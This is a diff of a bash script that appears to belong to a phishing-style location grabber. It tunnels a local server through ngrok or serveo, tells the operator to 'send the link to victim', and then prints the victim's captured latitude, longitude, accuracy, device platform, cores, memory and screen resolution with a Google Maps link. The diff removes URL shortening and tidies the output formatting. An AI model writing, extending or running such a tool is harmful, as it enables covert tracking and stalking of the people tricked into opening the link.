@@ -134,11 +134,8 @@ sleep 2
 cd .server && ./ngrok http 5555 > /dev/null 2>&1 &
 sleep 5
 glocngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-glocngrokshorturl=$(curl -s http://tinyurl.com/api-create.php?url=$glocngroklink)
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $glocngroklink
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Shortened Url :\e[0m\e[1;93m %s \n" $glocngrokshorturl
 
 glocfound
 
@@ -177,11 +174,8 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 printf "\n"
 sleep 5
 gloc_send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .grablink)
-glocserveoshorturl=$(curl -s http://tinyurl.com/api-create.php?url=$gloc_send_url)
 printf "\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $gloc_send_url
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Shortened Url :\e[0m\e[1;93m %s \n" $glocserveoshorturl
 
 glocfound
 
@@ -284,20 +278,23 @@ width=$(grep -o 'Screen Width:.*' .server/location/location.txt | cut -d ":" -f2
 printf "\n"
 printf " \e[1;31m[\e[1;37m::\e[1;31m]\e[1;33m Geolocation \e[1;31m[\e[1;37m::\e[1;31m]\e[0m\n"
 printf "\n"
-printf "  \e[0m\e[1;93m  Latitude          \e[0m\e[1;96m:\e[0m\e[1;92m   $latitude\e[0m\n"
-printf "  \e[0m\e[1;93m  Longitude         \e[0m\e[1;96m:\e[0m\e[1;92m   $longitude\e[0m\n"
-printf "  \e[0m\e[1;93m  Accuracy          \e[0m\e[1;96m:\e[0m\e[1;92m   $accuracy\e[0m\n"
+printf "  \e[0m\e[1;93m  Latitude     \e[0m\e[1;96m:\e[0m\e[1;92m   $latitude\e[0m\n"
+printf "  \e[0m\e[1;93m  Longitude    \e[0m\e[1;96m:\e[0m\e[1;92m   $longitude\e[0m\n"
+printf "  \e[0m\e[1;93m  Accuracy     \e[0m\e[1;96m:\e[0m\e[1;92m   $accuracy\e[0m\n"
 printf "\e[0m\n"
 printf "  \e[0m\e[1;93m  GOOGLE Maps   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$latitude,$longitude\e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[1;37m::\e[1;31m]\e[1;33m Device Info \e[1;31m[\e[1;37m::\e[1;31m]\e[0m\n"
 printf "\e[0m\n"
-printf "  \e[0m\e[1;93m  Platform          \e[0m\e[1;96m:\e[0m\e[1;92m   $platform\e[0m\n"
-printf "  \e[0m\e[1;93m  Cores             \e[0m\e[1;96m:\e[0m\e[1;92m   $hardware\e[0m\n"
-printf "  \e[0m\e[1;93m  Memory            \e[0m\e[1;96m:\e[0m\e[1;92m   $memory\e[0m\n"
-printf "  \e[0m\e[1;93m  Resolution        \e[0m\e[1;96m:\e[0m\e[1;92m   %sx%s\n\e[0m" $height $width
+printf "  \e[0m\e[1;93m  Platform     \e[0m\e[1;96m:\e[0m\e[1;92m   $platform\e[0m\n"
+printf "  \e[0m\e[1;93m  Cores        \e[0m\e[1;96m:\e[0m\e[1;92m   $hardware\e[0m\n"
+printf "  \e[0m\e[1;93m  Memory       \e[0m\e[1;96m:\e[0m\e[1;92m   $memory\e[0m\n"
+printf "  \e[0m\e[1;93m  Resolution   \e[0m\e[1;96m:\e[0m\e[1;92m   %sx%s\n\e[0m" $height $width
 cat .server/location/location.txt >> location.txt
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m location.txt\e[0m\n"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Saved as :\e[0m\e[1;93m location.txt\e[0m\n"
+printf "\e[0m\n"
+printf "\e[0m\n"
 
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
@@ -308,7 +305,6 @@ fi
 exit 1
 
 }
-
 
 
 
